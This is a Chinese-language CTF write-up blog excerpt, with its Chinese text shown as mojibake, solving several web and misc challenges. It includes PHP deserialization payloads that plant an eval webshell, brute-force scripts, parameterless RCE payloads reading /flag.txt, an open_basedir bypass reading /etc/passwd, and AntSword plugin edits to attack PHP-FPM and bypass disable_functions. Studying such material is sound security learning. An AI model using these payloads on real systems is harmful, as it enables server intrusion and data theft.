    <id>https://zwh-china.github.io/2021/05/23/%E5%B7%9D%E4%BC%A0/</id>
    <published>2021-05-22T17:13:55.000Z</published>
    <updated>2021-05-22T22:12:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="misc-æ—¥å¿—åˆ†æ"><a href="#misc-æ—¥å¿—åˆ†æ" class="headerlink" title="misc-æ—¥å¿—åˆ†æ"></a>misc-æ—¥å¿—åˆ†æ</h2><p>ä¸‹è½½å¾—åˆ°access.logç®€å•åˆ†æå‘ç°æ—¶SQLæ³¨å…¥æµé‡åˆ†æã€‚å†™ä¸ªè„šæœ¬ç®€å•ç­›é€‰ä»¥ä¸‹</p><pre><code class="python">from urllib import parsewith open(&#39;./access.log&#39;,mode=&#39;r&#39;) as file:    with open(&#39;./raw.log&#39;,mode=&#39;w&#39;) as out:        for line in file.readlines():            t = parse.unquote(line)             print(t)            if &#39;flag&#39; not in t:                pass            else:                out.write(t)</code></pre><p>è¿™æ ·ä¸€æ¥å°±å¯¼å‡ºäº†å«æœ‰flagå­—æ®µçš„è¡Œã€‚æ¥ä¸‹æ¥éœ€è¦åˆ¤æ–­flagå„ä¸ªä½çš„å­—ç¬¦ï¼Œç®€å•çœ‹ä¸€ä¸‹ä½¿ç”¨çš„æ˜¯æ—¶é—´ç›²æ³¨ï¼Œè§‚å¯Ÿå‘ç°ä¸ºï¼=æ‰€é‡‡ç”¨çš„æ•°å­—å¯¹åº”çš„asciiå€¼åˆ™ä¸ºflagå­—æ®µä¸€éƒ¨åˆ†ã€‚åœ¨å†™ä¸ªè„šæœ¬å¤„ç†</p><pre><code class="python">import reflag=[]pattern = re.compile(r&#39;!=[\d]*&#39;)with open(&#39;./raw.log&#39;,mode=&#39;r&#39;) as file:    for line in file.readlines():        temp = pattern.findall(line)        if len(temp)!=0:            print(temp[0])            _,num=temp[0].split(&#39;!=&#39;)            flag.append(chr(int(num)))for a in flag:    print(a,end=&#39;&#39;)</code></pre><p><code>flag&#123;3287fe300f28e24aefa2d86883832c9f&#125;</code></p><h2 id="web-æŠ½å¥–"><a href="#web-æŠ½å¥–" class="headerlink" title="web-æŠ½å¥–"></a>web-æŠ½å¥–</h2><p>ç®€å•è½¬è½®æŠ½å¥–ã€‚çœ‹æºç åˆ†æå¾—çŸ¥æŠ½å¥–æ•°æ®é€šè¿‡data.phpä»¥jsonæ•°æ®è¿”å›ã€‚å†™è„šæœ¬çˆ†ç ´</p><pre><code class="python">import requestsimport jsonimport multiprocessingdef solve():    while True:        text=requests.get(&#39;http://42.193.13.21:51735/data.php&#39;).content.decode(&#39;utf-8&#39;)        text=json.loads(text)        tmp=text[&#39;flag&#39;]        tmp=tmp.encode(&#39;utf-8&#39;)        print(tmp.decode(&#39;utf-8&#39;))if __name__ == &#39;__main__&#39;:    for i in range(20):        p=multiprocessing.Process(target=solve,daemon=True)        p.start()        if i==19:            p.join()</code></pre><pre><code>å¥½ä¸å®¹æ˜“æŠ½ä¸ªä¸‰ç­‰å¥–ï¼Œè¿˜æ˜¯æ²¡æœ‰FLAGï¼Œå˜¿å˜¿!å¥–éƒ½æ²¡æ‹¿åˆ°å°±æƒ³è¦FLAG?å¥–éƒ½æ²¡æ‹¿åˆ°å°±æƒ³è¦FLAG?ä½ çœ‹çœ‹ä½ ï¼Œçœ‹çœ‹ä½ ï¼Œæˆå¤©å°±æƒ³è¦FLAG!å¥½ä¸å®¹æ˜“æŠ½ä¸ªä¸‰ç­‰å¥–ï¼Œè¿˜æ˜¯æ²¡æœ‰FLAGï¼Œå˜¿å˜¿!flag&#123;4a346639-087e-6554-4788-48994edf0fe5&#125;å¥½ä¸å®¹æ˜“æŠ½ä¸ªä¸‰ç­‰å¥–ï¼Œè¿˜æ˜¯æ²¡æœ‰FLAGï¼Œå˜¿å˜¿!å¥–éƒ½æ²¡æ‹¿åˆ°å°±æƒ³è¦FLAG?</code></pre><h2 id="web-Source"><a href="#web-Source" class="headerlink" title="web-Source"></a>web-Source</h2><p>è®¿é—®index.php?source=1å¾—åˆ°ç¬¬ä¸€é¢˜</p><pre><code class="php">&lt;?phpclass Getflag&#123;    protected $value=1;    public function __destruct()&#123;        echo $this-&gt;value;    &#125;&#125;$a=new Getflag();echo urlencode(serialize($a));//O%3A7%3A&quot;Getflag&quot;%3A1%3A&#123;s%3A8%3A&quot;%00*%00value&quot;%3Bi%3A1%3B&#125;</code></pre><p>åŒå†™ç»•è¿‡,ä½¿ç”¨GetGetflagflagï¼Œä½œä¸ºä½œä¸ºå¯¹è±¡åè¿™æ ·åœ¨<code>str_replace</code>åå°±ä¼šè¢«æ›¿æ¢ä¸º<code>Getflag</code></p><pre><code class="php">&lt;?phperror_reporting(0);include(&#39;flag.php&#39;);if($_GET[&#39;source&#39;] == 1)&#123;    highlight_file(&quot;sssssource.txt&quot;);&#125;class Getflag&#123;    protected $value=0;    public function __destruct()&#123;        echo $this-&gt;value;        if($this-&gt;value==1)            show_flag();        else            die(&#39;nonono&#39;);       &#125;&#125;$ans=$_GET[&#39;ans&#39;];$ans=str_replace(&#39;Getflag&#39;, &#39;&#39;, $ans);unserialize($ans);if(isset($_GET[&#39;A&#39;]) &amp;&amp; isset($_GET[&#39;B&#39;]))&#123;    $md51=md5($_GET[&#39;A&#39;]);    $md52=md5($_GET[&#39;B&#39;]);    if($md51 == $md52)&#123;        show_source(__FILE__);  &#125;&#125;?&gt;</code></pre><p>ç®€å•çš„md5ç»•è¿‡ï¼Œè€ƒè™‘é‡‡ç”¨æ•°ç»„ç»•è¿‡</p><p><code>?source=1&amp;A[]=a&amp;B[]=b</code></p><p>æœ€åä¸€å±‚</p><pre><code class="php">&lt;?phperror_reporting(0);show_source(__FILE__);class CatchRecord &#123;        public $filename,$out,$msg;        public function __wakeup()&#123;                $this-&gt;filename = 1;        &#125;        public function __destruct()&#123;                if ($this-&gt;filename != 0)                        $this-&gt;filename = &quot;error.log&quot;;                else                        $this-&gt;filename = &quot;access.log&quot;;                $this-&gt;out = date(&quot;Y/m/d/H/i/s&quot;).&quot; &quot;.$_SERVER[&#39;REMOTE_ADDR&#39;].&quot;:&quot;.$this-&gt;msg;                file_put_contents($this-&gt;filename, $this-&gt;out);        &#125;&#125;       $ans=$_GET[&#39;ans&#39;];unserialize($ans); </code></pre><p>æ„é€ poc</p><pre><code class="php">&lt;?phpclass CatchRecord &#123;        public $filename,$out,$msg;        public function __wakeup()&#123;                $this-&gt;filename = 1;        &#125;        public function __destruct()&#123;                if ($this-&gt;filename != 0)                        $this-&gt;filename = &quot;error.log&quot;;                else                        $this-&gt;filename = &quot;access.log&quot;;                $this-&gt;out = date(&quot;Y/m/d/H/i/s&quot;).&quot; &quot;.$_SERVER[&#39;REMOTE_ADDR&#39;].&quot;:&quot;.$this-&gt;msg;                file_put_contents($this-&gt;filename, $this-&gt;out);        &#125;&#125; $a=new CatchRecord();$a-&gt;filename=0;$a-&gt;out=&amp;$a-&gt;filename;$a-&gt;msg=&#39;&lt;?php eval($_POST[a]);?&gt;/../../../../../../webshell.php&#39;;var_dump(urlencode(serialize($a)));?&gt;//O%3A11%3A%22CatchRecord%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bi%3A0%3Bs%3A3%3A%22out%22%3BR%3A2%3Bs%3A3%3A%22msg%22%3Bs%3A55%3A%22%3C%3Fphp+eval%28%24_POST%5Ba%5D%29%3B%3F%3E%2F..%2F..%2F..%2F..%2F..%2F..%2Fwebshell.php%22%3B%7D</code></pre><p>ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆwebshell.php</p><p><code>2020/08/21/11/12/33 172.16.101.234:&lt;?php eval($_POST[a]);?&gt;/../../../../../../webshell.php</code></p><p>AntSwordè¿æ¥cat flag</p><p>flag{a6751d78-d89a-798e-590e-026327cb7749}</p><h2 id="web-baopo"><a href="#web-baopo" class="headerlink" title="web-baopo"></a>web-baopo</h2><p>éªŒè¯ç çˆ†ç ´</p><pre><code class="python">import requestsimport base64import threadingimport timeurl = &quot;http://42.193.13.21:51310/yzm.php&quot;num_arr = []t_list = []for x in range(0,1000000):    num = base64.b64encode(str(x).zfill(6).encode()).decode()    num_arr.append(num)print(len(num_arr))def bp(num):    data = &#123;        &quot;yzm&quot; : num    &#125;    header = &#123;        &quot;Content-Type&quot; : &quot;application/x-www-form-urlencoded&quot;    &#125;    try:        res = requests.post(url=url, data=data, headers=header, timeout=1.5)        if &quot;é”™è¯¯&quot; not in res.text:            f = open(&quot;yzm&quot;, &quot;w+&quot;)            f.write(num)            f.close()    except Exception as e:        f = open(&quot;err&quot;,&quot;a&quot;)        f.write(num+&quot;\n&quot;)    for x in range(1, len(num_arr)):#è¿™é‡Œè®¾ç½®ä»å“ªé‡Œå¼€å§‹åˆ°å“ªé‡Œç»“æŸ    t = threading.Thread(target=bp, args=(num_arr[x], ))    t_list.append(t)    if x % 300 == 0:#è¿™é‡Œè°ƒçº¿ç¨‹,erré‡Œæ˜¯è¶…æ—¶        for t in t_list:            t.start()        t_list = []        print(x)        time.sleep(5)</code></pre><p>å¾—åˆ°éªŒè¯ç ï¼Œè¿›è¡Œæ‰¾å›å¯†ç ï¼Œè´¦å·æ˜¯adminã€‚è¿›å…¥åå‘ç°ç»å…¸æ— å‚rce</p><pre><code class="php">&lt;?phpif(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;        eval($_GET[&#39;code&#39;]);&#125; else &#123;    show_source(__FILE__);&#125;?&gt;</code></pre><p>å€Ÿé‰´ä¸¤ä½å¸ˆå‚…å†™çš„wp</p><ul><li><a href="https://blog.csdn.net/qq_45449318/article/details/105237550">https://blog.csdn.net/qq_45449318/article/details/105237550</a></li><li><a href="https://xz.aliyun.com/t/3537">https://xz.aliyun.com/t/3537</a></li></ul><p>å…ˆ</p><pre><code class="php">?code = print_r(getcwd());=&gt;æŸ¥çœ‹è·¯å¾„ä¸‹å†…å®¹æ²¡æœ‰å¯ç”¨çš„?code = print_r(scandir(getcwd()))=&gt;æ¢æµ‹ä¸Šä¸€çº§ä¸ºArray ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag_phpbyp4ss [3] =&gt; html )?code = print_r(scandir(dirname(getcwd())))</code></pre><p>è¿™é¢˜flagåœ¨æ ¹ç›®å½•æ‰€ä»¥è¦å¤šå±‚åµŒå¥—</p><p><code>?code=print_r(scandir(dirname(dirname(dirname(getcwd())))));</code></p><p>å¾—åˆ°</p><pre><code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; boot [5] =&gt; dev [6] =&gt; etc [7] =&gt; flag.txt [8] =&gt; home [9] =&gt; lib [10] =&gt; lib64 [11] =&gt; media [12] =&gt; mnt [13] =&gt; my_init [14] =&gt; my_service [15] =&gt; opt [16] =&gt; proc [17] =&gt; root [18] =&gt; run [19] =&gt; sbin [20] =&gt; srv [21] =&gt; sys [22] =&gt; tmp [23] =&gt; usr [24] =&gt; var ) ;</code></pre><p>ç„¶å</p><p><code>?code=system(end(current(get_defined_vars())));&amp;b=cat /flag.txt</code></p><p><code>flag&#123;3b49971b-ad5a-656f-bc6f-1f60b31fcb96&#125;</code></p><p>å¾—åˆ°flag æ­¤å¤„payloadå‚è€ƒå¸ˆå‚…åšå®¢ï¼ˆ<a href="https://blog.csdn.net/qq_45449318/article/details/105237550%EF%BC%89">https://blog.csdn.net/qq_45449318/article/details/105237550ï¼‰</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;misc-æ—¥å¿—åˆ†æ&quot;&gt;&lt;a href=&quot;#misc-æ—¥å¿—åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;misc-æ—¥å¿—åˆ†æ&quot;&gt;&lt;/a&gt;misc-æ—¥å¿—åˆ†æ&lt;/h2&gt;&lt;p&gt;ä¸‹è½½å¾—åˆ°access.logç®€å•åˆ†æå‘ç°æ—¶SQLæ³¨å…¥æµé‡åˆ†æã€‚å†™ä¸ªè„šæœ¬ç®€å•ç­›é€‰ä»¥ä¸‹&lt;</summary>
      
    
    
    
    <category term="CTFå­¦ä¹ " scheme="https://zwh-china.github.io/categories/CTF%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>ä¸€é“phpé¢˜ç›®çš„å¤ç° one_pointer_php</title>
    <link href="https://zwh-china.github.io/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/"/>
    <id>https://zwh-china.github.io/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-05-22T17:13:55.000Z</published>
    <updated>2021-05-22T22:25:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å½“æ—¶2021è“å¸½æ¯æœ‰é“phpè¿˜æŒºæœ‰æ„æ€ï¼Œä¾¿æŠ½ç©ºå¤ç°ä¸€ä¸‹ã€‚æ„Ÿè§‰å­¦åˆ°å¾ˆå¤šè‡ªå·±ä»¥å‰æ²¡æŒæ¡çš„çŸ¥è¯†ç‚¹</p><ul><li>suidææƒ</li><li>æ•°ç»„ä¸‹æ ‡è¶Šç•Œå¯¼è‡´ç»•è¿‡èµ‹å€¼ifåˆ¤å®š</li><li>open_basedirç»•è¿‡</li><li>php-fpm disable functionç»•è¿‡</li><li>æ‹¿åˆ°å‘½ä»¤æ‰§è¡Œåçš„åŸºæœ¬ä¿¡æ¯æ”¶é›†</li><li>æ—¥php-fpm</li><li>é€šè¿‡ä¿®æ”¹èšå‰‘çš„æ’ä»¶ disable_functionç®€åŒ–è§£é¢˜è¿‡ç¨‹</li></ul><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><h3 id="æ•°ç»„ä¸‹æ ‡æº¢å‡ºç»•è¿‡"><a href="#æ•°ç»„ä¸‹æ ‡æº¢å‡ºç»•è¿‡" class="headerlink" title="æ•°ç»„ä¸‹æ ‡æº¢å‡ºç»•è¿‡"></a>æ•°ç»„ä¸‹æ ‡æº¢å‡ºç»•è¿‡</h3><p>è¿™é“é¢˜ç›®èµµæ€»åœ¨buuè¿›è¡Œäº†ç¯å¢ƒæ­å»ºï¼Œçœå»äº†ä¸å°‘éº»çƒ¦ã€‚ç‚¹èµğŸ‘ï¼<code>[è“å¸½æ¯ 2021]One Pointer PHP</code></p><p>é¦–å…ˆä¸‹è½½é™„ä»¶ï¼Œå¾—åˆ°ä¸¤ä¸ªphpæ–‡ä»¶</p><p>add_api.php</p><pre><code class="php">&lt;?phpinclude &quot;user.php&quot;;if($user=unserialize($_COOKIE[&quot;data&quot;]))&#123;    $count[++$user-&gt;count]=1;    if($count[]=1)&#123;        $user-&gt;count+=1;        setcookie(&quot;data&quot;,serialize($user));    &#125;else&#123;        eval($_GET[&quot;backdoor&quot;]);    &#125;&#125;else&#123;    $user=new User;    $user-&gt;count=1;    setcookie(&quot;data&quot;,serialize($user));&#125;?&gt;</code></pre><p>user.php</p><pre><code class="php">&lt;?phpclass User&#123;    public $count;&#125;?&gt;</code></pre><p>å¾ˆå®¹æ˜“çœ‹å‡ºï¼Œæƒ³å»evalæˆ‘ä»¬çš„backdoorå‚æ•°å°±å¿…é¡»ä½¿å¾—è¯­å¥<code>$count[]=1</code>ä¸ºflaseã€‚è¿™é‡Œè¿™ç§å†™æ³•çš„æ„ä¹‰ã€‚å¯ä»¥å‚è€ƒä»¥ä¸‹è¿™æ®µä»£ç ï¼Œåœ¨ä¸æŒ‡å®šä¸‹æ ‡çš„æƒ…å†µä¸‹ï¼Œä¼šåœ¨å½“å‰æœ€å¤§indexå‰åŠ 1å¹¶èµ‹å€¼ã€‚</p><pre><code class="php">&lt;?php$array[10] = 10;    for($i = 0; $i &lt; 100; $i++)&#123;        $array[] = $i;    &#125;    var_dump($array)?&gt;/*array (size=101)  10 =&gt; int 10  11 =&gt; int 0  12 =&gt; int 1  13 =&gt; int 2......*/</code></pre><p>é‚£ä¹ˆè¿™å°±æ¶‰åŠphpæ•°ç»„ä¸‹æ ‡æº¢å‡ºã€‚åœ¨phpä¸­intå‹å˜é‡çš„èŒƒå›´ä¸º2^31ä¹Ÿå°±æ˜¯2147483647ã€‚å½“æˆ‘ä»¬è®¾ç½®userç±»ä¸­çš„countå€¼ä¸º2147483646æ—¶ã€‚å†å¯¹å…¶åŠ 1å°±ä¼šäº§ç”ŸæŠ¥é”™<code>Warning:  Cannot add element to the array as the next element is already occupied </code>å½“è®¾ç½®countä¸º2147483647æ—¶åˆ™ä¼šäº§ç”Ÿä¸Šç•Œæº¢å‡ºï¼Œä¸ä¼šäº§ç”Ÿä»»ä½•è­¦å‘Šã€‚ä¸‹æ ‡è¢«è®¾ç½®ä¸º-9223372036854775808ã€‚<strong>ä½†æ˜¯æˆ‘åœ¨æµ‹è¯•æ—¶å‘ç°phpç‰ˆæœ¬ä¸º5.5.12æ—¶å¹¶æœªè§‚å¯Ÿåˆ°è­¦å‘Šå‡ºç°ã€‚</strong>è¿™æ ·ä¸€æ¥<code>$count[++$user-&gt;count]=1;</code>è¯­å¥æ‰§è¡Œå<code>$user-&gt;count</code>ä¼šå˜æˆintä¸Šç•Œ2147483647ã€‚è€Œåé¢çš„<code>if($count[]=1)</code>ä¹Ÿä¼šè¿”å›falseè¿›è€Œè¾¾åˆ°ç»•è¿‡çš„ç›®çš„</p><p>æ‰€ä»¥æˆ‘ä»¬æ„é€ payloadåºåˆ—åŒ–ä¸²<code>O:4:&quot;User&quot;:1:&#123;s:5:&quot;count&quot;;i:9223372036854775806;&#125;</code>è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯éœ€è¦å¯¹å…¶è¿›è¡Œurlencodeï¼Œæ‰€ä»¥æœ€åå¡«åˆ°cookieé‡Œåº”è¯¥æ˜¯è¿™æ ·çš„</p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20210521225143086.png" alt="image-20210521225143086" style="zoom:200%;"><p>ç„¶åè‚¯å®šè¦<code>phpinfo()</code>çœ‹ä¸€ä¸‹</p><p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20210521230130804.png" alt="image-20210521230130804"></p><p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20210521230520481.png" alt="image-20210521230520481"></p><p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20210521230321983.png" alt="image-20210521230321983"></p><p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20210521230428995.png" alt="image-20210521230428995"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œdisableäº†å¾ˆå¤šå‡½æ•°ï¼Œè¿˜å¯ç”¨äº†open_basedirã€‚å¯ç”¨äº†php-fpm fast-cgiã€‚è€ƒè™‘ç”¨è¿™ä¸ªç‰¹æ€§ç»•è¿‡disable_functionã€‚æ—¢ç„¶å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†ï¼Œè€Œä¸”file_put_contentsæ²¡æœ‰è¢«ç¦ç”¨ã€‚è€ƒè™‘å…ˆå†™ä¸ªé©¬ï¼Œèšå‰‘è¿ä¸Šå»çœ‹çœ‹ï¼Œä½¿ç”¨payload<code>?backdoor=$a=&#39;&lt;?php eval($_POST[cmd]); ?&gt;&#39;;file_put_contents(&#39;./test.php&#39;,$a);</code>ç„¶åèšå‰‘é“¾æ¥ã€‚è¿™æ—¶shellæ˜¯æ²¡å•¥ç”¨çš„ï¼Œå› ä¸ºæœ‰disable_functionå’Œopen_basediré™åˆ¶ã€‚è¿™æ—¶è€ƒè™‘å…ˆåšä¸€ä¸‹ä¿¡æ¯æ”¶é›†å’Œèšå‰‘disable_functionç»•è¿‡æ’ä»¶ã€‚</p><h3 id="open-basedirç»•è¿‡"><a href="#open-basedirç»•è¿‡" class="headerlink" title="open_basedirç»•è¿‡"></a>open_basedirç»•è¿‡</h3><p>å› ä¸ºopen_basediré™åˆ¶ï¼Œè€ƒè™‘å…ˆæ‰‹åŠ¨åˆ©ç”¨å‘½ä»¤æ‰§è¡Œåšä¸€ä¸‹ä¿¡æ¯æ”¶é›†ã€‚ä»Bubb1eçš„åšå®¢ä¸Šçœ‹åˆ°ä¸¤ç§åŠæ³•</p><pre><code class="php">å…ˆå°è¯•ç»•è¿‡open_basediråˆ—ä¸€ä¸‹æ ¹ç›®å½•è¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯globåè®®ï¼šä¸Šä¼ ä¸€ä¸ªglob.phpæ–‡ä»¶ï¼Œå†…å®¹ä¸º&lt;?php  $a = &quot;glob:///*&quot;;  if ( $b = opendir($a) ) &#123;    while ( ($file = readdir($b)) !== false ) &#123;      echo &quot;filename:&quot;.$file.&quot;\n&quot;;    &#125;    closedir($b);  &#125;?&gt;è®¿é—®åå›æ˜¾filename:binfilename:bootfilename:devfilename:etcfilename:flagfilename:homefilename:libfilename:lib64filename:mediafilename:mntfilename:optfilename:procfilename:rootfilename:runfilename:sbinfilename:srvfilename:sysfilename:tmpfilename:usrfilename:varå‘ç°flagï¼Œä½†æ˜¯è¿™ç§æ–¹æ³•åªèƒ½åˆ—ç›®å½•ï¼Œæ— æ³•è¯»æ–‡ä»¶å¦ä¸€ç§æ–¹å¼æ˜¯&lt;?phpmkdir(&#39;mi1k7ea&#39;);chdir(&#39;mi1k7ea&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&quot;/&quot;));echo file_get_contents(&#39;/etc/passwd&#39;);</code></pre><h3 id="å¾—åˆ°å‘½ä»¤æ‰§è¡Œåçš„ä¿¡æ¯æ”¶é›†"><a href="#å¾—åˆ°å‘½ä»¤æ‰§è¡Œåçš„ä¿¡æ¯æ”¶é›†" class="headerlink" title="å¾—åˆ°å‘½ä»¤æ‰§è¡Œåçš„ä¿¡æ¯æ”¶é›†"></a>å¾—åˆ°å‘½ä»¤æ‰§è¡Œåçš„ä¿¡æ¯æ”¶é›†</h3><p>æˆ‘é‡‡ç”¨çš„æ˜¯ç¬¬äºŒç§æ–¹æ³•æŸ¥çœ‹è·¯å¾„å’Œæ–‡ä»¶ã€‚è¿™é‡Œæ‰¾åˆ°flagä½†æ˜¯è¯»ä¸äº†ï¼Œè€ƒè™‘æ˜¯å› ä¸ºæƒé™ä¸è¶³å¯¼è‡´ã€‚æ‰€ä»¥åœ¨è¿™é‡Œä¸ä½†è¦æ¢æŸ¥flagåå­—å’Œä½ç½®ï¼Œè¿˜è¦åšä¸€äº›ä¿¡æ¯æ”¶é›†ï¼Œä¾‹å¦‚PHP-FPMå†…ç½‘æœåŠ¡ç«¯å£ã€‚å…ˆçœ‹ä¸‹<code>/proc/self/cmdline</code>å‘ç°æ˜¯<code>php-fpm: pool www</code> è®¿é—®<code>/etc/nginx/sites-available/default</code>å¾—åˆ°é…ç½®ä¿¡æ¯</p><pre><code>### You should look at the following URL&#39;s in order to grasp a solid understanding# of Nginx configuration files in order to fully unleash the power of Nginx.# https://www.nginx.com/resources/wiki/start/# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/# https://wiki.debian.org/Nginx/DirectoryStructure## In most cases, administrators will remove this file from sites-enabled/ and# leave it as reference inside of sites-available where it will continue to be# updated by the nginx packaging team.## This file will automatically load configuration files provided by other# applications, such as Drupal or Wordpress. These applications will be made# available underneath a path with that package name, such as /drupal8.## Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.### Default server configuration#server &#123;    listen 80 default_server;    listen [::]:80 default_server;    # SSL configuration    #    # listen 443 ssl default_server;    # listen [::]:443 ssl default_server;    #    # Note: You should disable gzip for SSL traffic.    # See: https://bugs.debian.org/773332    #    # Read up on ssl_ciphers to ensure a secure configuration.    # See: https://bugs.debian.org/765782    #    # Self signed certs generated by the ssl-cert package    # Don&#39;t use them in a production server!    #    # include snippets/snakeoil.conf;    root /var/www/html;    # Add index.php to the list if you are using PHP    index index.php index.html index.htm index.nginx-debian.html;    server_name _;    location / &#123;        # First attempt to serve request as file, then        # as directory, then fall back to displaying a 404.        try_files $uri $uri/ =404;    &#125;    # pass PHP scripts to FastCGI server    #    location ~ \.php$ &#123;    root           html;    fastcgi_pass   127.0.0.1:9001;    fastcgi_index  index.php;    fastcgi_param  SCRIPT_FILENAME  /var/www/html/$fastcgi_script_name;    include        fastcgi_params;    &#125;    # deny access to .htaccess files, if Apache&#39;s document root    # concurs with nginx&#39;s one    #    #location ~ /\.ht &#123;    #    deny all;    #&#125;&#125;# Virtual Host configuration for example.com## You can move that to a different file under sites-available/ and symlink that# to sites-enabled/ to enable it.##server &#123;#    listen 80;#    listen [::]:80;##    server_name example.com;##    root /var/www/example.com;#    index index.html;##    location / &#123;#        try_files $uri $uri/ =404;#    &#125;#&#125;</code></pre><p>å¯ä»¥çœ‹åˆ°FastCGIå¼€æ”¾åœ¨æœ¬åœ°9001ç«¯å£ã€‚æ ¹æ®èšå‰‘ï¼Œå‘ç°</p><p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/image-20210523015906706.png" alt="image-20210523015906706"></p><p>é»˜è®¤éƒ½æ˜¯9000ç«¯å£ï¼Œæ‰€ä»¥å¾ˆæ˜¾ç„¶æˆ‘ä»¬éœ€è¦å¯¹èšå‰‘æ’ä»¶è¿›è¡Œä¸€äº›ä¿®æ”¹ï¼Œè¿™é‡Œå‚è€ƒäº†WHOAMIå¸ˆå‚…çš„åšå®¢ï¼Œä»¥ä¸‹å†…å®¹æ‘˜è‡ªå¸ˆå‚…åšå®¢</p><hr><p>åœ¨èšå‰‘ä¸­ä¹Ÿæœ‰é€šè¿‡æ”»å‡» PHP-FPM ç»•è¿‡ Disable_Functions çš„æ’ä»¶å•Šï¼Œä½†å½“æ—¶ä¸ºä»€ä¹ˆå°±ç”¨ä¸äº†å‘¢ï¼ŸåŸæ¥ä»–èšå‰‘çš„ Payload  ä¸­ç”¨åˆ°çš„ fsockopen()ï¼Œè€Œ fsockopen() è¢« Disable_Functions ç»™ç¦äº†ï¼Œå¹¶ä¸”èšå‰‘çš„æ’ä»¶ä¸­æ²¡æœ‰  PHP-FPM åœ°å€ä¸º 127.0.0.1:9001 çš„é€‰é¡¹ï¼Œæ‰€ä»¥è‡ªç„¶å°±æˆåŠŸä¸äº†ï¼š</p><p>ä½†æ˜¯åœ¨ PHP ä¸­é™¤äº† <code>fsockopen()</code> è¿™ä¸ªå‡½æ•°å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ª <code>pfsockopen()</code> äºŒè€…å‡ ä¹æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œåœ¨ <code>fsockopen()</code> è¢«ç¦ç”¨åæˆ‘ä»¬å¯ä»¥ç”¨ <code>pfsockopen()</code> è¿›è¡Œä»£æ›¿ã€‚æˆ‘ä»¬å¯ä»¥å¯¹èšå‰‘çš„ Payload è¿›è¡Œä¿®æ”¹ï¼Œå³å°† Payload æ‰€æœ‰çš„ <code>fsockopen()</code> æ›¿æ¢ä¸º <code>pfsockopen()</code>ã€‚éœ€è¦æ›¿æ¢çš„æ–‡ä»¶æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p><ul><li>\antData\plugins\as_bypass_php_disable_functions-master\payload.js</li><li>\antData\plugins\as_bypass_php_disable_functions-master\core\php_fpm\index.js</li></ul><p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/20210504010246.png" alt="20210504010246"></p><p>ç„¶åè¿›å…¥åˆ° \core\php_fpm\index.js ä¸­ï¼Œåœ¨ vals ä¸­å°† 127.0.0.1:9000 æ”¹ä¸º 127.0.0.1:9001 çš„é€‰é¡¹ï¼š</p><p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/20210504120305.png" alt="20210504120305"></p><p><img src="/2021/05/23/%E4%B8%80%E9%81%93php%E9%A2%98%E7%9B%AE%E7%9A%84%E5%A4%8D%E7%8E%B0/20210504120300.png" alt="20210504120300"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæˆåŠŸç»•è¿‡ã€‚</p><p>æˆåŠŸåèšå‰‘ä¼šåœ¨ <code>/var/www/html</code> ç›®å½•ä¸Šä¼ ä¸€ä¸ª <code>.antproxy.php</code> æ–‡ä»¶ã€‚æˆ‘ä»¬åˆ›å»ºå‰¯æœ¬ï¼Œå¹¶å°†è¿æ¥çš„ URL shell è„šæœ¬åå­—æ”¹ä¸º <code>.antproxy.php</code> 